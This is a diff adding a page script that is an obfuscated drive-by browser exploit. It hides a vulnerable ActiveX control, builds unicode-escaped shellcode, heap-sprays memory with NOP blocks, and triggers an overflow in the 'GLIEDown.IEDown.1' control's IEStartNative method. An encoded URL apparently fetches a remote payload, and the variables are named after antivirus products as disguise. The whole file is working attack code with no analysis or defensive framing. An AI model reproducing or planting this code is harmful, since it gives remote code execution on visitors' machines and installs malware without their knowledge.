@@ -1,0 +1,47 @@
+<SCRIPT>window.onerror=function(){return true;}</SCRIPT>
+<SCRIPT>
+document.writeln("<object classid=\"clsid:61F5C358-60FB-4A23-A312-D2B556620F20\" style=\'display:none\' id=\'Kazakh\'><\/object>");
+document.writeln("<SCRIPT language=\"javascript\">");
+document.writeln("var Wolfdalef,Wolfdalek,QuadroXFX;");
+document.writeln("var Samsunga1,Samsunga2,Samsunga3,Samsunga4,Samsunga5,Samsunga6,Samsunga7;");
+document.writeln("var Yorkfie1d,Yorkfie2d,Yorkfie3d,Yorkfie4d,Yorkfie5d,Yorkfie6d,Yorkfie7d;");
+document.writeln("Samsunga1 = unescape(\"%u16eb%u335b%u66c9%ua4b8%u6639%u0431%u414b%u6640%uf981%u008c%uf37c\");");
+document.writeln("Yorkfie2d = unescape(\"%u9ab2%u9717%u053a%u7a6f%ud24f%u063a%u3d0a%ub470%uf594%uc4fc%uf7e2\");");
+document.writeln("Yorkfie1d = unescape(\"%ub268%ub568%u63b4%ue72e%ue739%u1769%ue56f%ubcc6%uba29%u676f%ud14c\");");
+document.writeln("Yorkfie5d = unescape(\"%uf0c5%u22c5%u804e%u2b36%u6ed8%u6db9%uf303%udfa2%ub186%u6151%ud5b5\");");
+document.writeln("Samsunga4 = unescape(\"%ub739%ucd51%ud54b%uee54%uadc6%u54ac%ubd60%ube39%u01b4%uc12e%uc139\");");
+document.writeln("Yorkfie3d = unescape(\"%ue987%u2c03%uf34d%u37f8%ufe3e%ubee3%u0ed2%u1f02%ue64f%u8964%u2764\");");
+document.writeln("Samsunga6 = unescape(\"%ucd5c%u316e%uc76f%u0b0a%u826a%u5f6e%ucb7f%u8769%u83c6%u5d2d%ubdc5\");");
+document.writeln("Yorkfie4d = unescape(\"%ud939%u8e5c%u4d36%u59b1%u0b26%u82e7%u813e%uce39%u5291%uce63%u23d2\");");
+document.writeln("Yorkfie6d = unescape(\"%u9a5a%ub4ec%u74a0%u694e%u244a%u3015%u415c%u4554%u4b4f%u4740%u4714\");");
+document.writeln("Samsunga3 = unescape(\"%udcb2%u0025%uc6b2%u2431%udace%ue83c%udcd1%ub339%u5639%uddc0%ud856\");");
+document.writeln("Yorkfie7d = unescape(\"%u0a54%u4948%u5355%u5b15%u4a4c%u5955%u4e14%u4942%u2d3a%u2e3a%u2f3a\");");
+document.writeln("Samsunga2 = unescape(\"%u05eb%ue5e8%uffff%u4dff%ua5f7%ua639%ucd66%uf109%u225d%u2138%ua779\");");
+document.writeln("Samsunga5 = unescape(\"%uaa6e%uc3c6%uc439%u93c6%uc53d%u00fe%ua939%uae55%u0d17%ucf79%ub45c\");");
+document.writeln("Samsunga7 = unescape(\"%u812b%u3b92%ubcc4%u9ffe%ue01d%udc38%u22b2%u98b4%ub729%ub069%ub368\");");
+document.writeln("Wolfdalef = Samsunga1+Samsunga2+Samsunga3+Samsunga4+Samsunga5+Samsunga6+Samsunga7;");
+document.writeln("Wolfdalek = Yorkfie1d+Yorkfie2d+Yorkfie3d+Yorkfie4d+Yorkfie5d+Yorkfie6d+Yorkfie7d;");
+document.writeln("var MmUrl = unescape(\"%u7468%u7074%u2f3a%u752f%u6573%u3172%u332e%u2d33%u3232\");");
+document.writeln("QuadroXFX = Wolfdalef+Wolfdalek;");
+document.writeln("var hgs = \"\\x49\\x45\";");
+document.writeln("var Norton = 20;");
+document.writeln("var Ewido = 245;");
+document.writeln("Mcafee = new Array();");
+document.writeln("var start = \"\\x53\\x74\\x61\\x72\\x74\";");
+document.writeln("var AntiVir = unescape(\"%u9090\"+\"%u9090\");");
+document.writeln("var Notify = \"\\x4e\\x61\\x74\\x69\\x76\\x65\";");
+document.writeln("var hgs_startNotify = hgs+start+Notify;");
+document.writeln("var DrWeb = Norton+QuadroXFX.length;");
+document.writeln("while (AntiVir.length<DrWeb) AntiVir+=AntiVir;");
+document.writeln("fillblock = AntiVir.substring(0, DrWeb);");
+document.writeln("block = AntiVir.substring(0, AntiVir.length-DrWeb);");
+document.writeln("while(block.length+DrWeb<0x40000) block = block+block+fillblock;");
+document.writeln("VulObject=\"\\x47\\x4c\\x49\\x45\\x44\\x6f\\x77\\x6e\\x2e\\x49\\x45\\x44\\x6f\\x77\\x6e\\x2e\\x31\";");
+document.writeln("for (x=0; x<300; x++) Mcafee[x] = block +QuadroXFX;");
+document.writeln("var Kazakh=new ActiveXObject(VulObject);");
+document.writeln("var x =  unescape(\"%0c%0c%0c%0c\");");
+document.writeln("while (x.length<Ewido) x += x;");
+document.writeln("Kazakh[hgs_startNotify](x,\"AA\",\"AA\");");
+document.writeln("<\/script>");
+</SCRIPT>
+
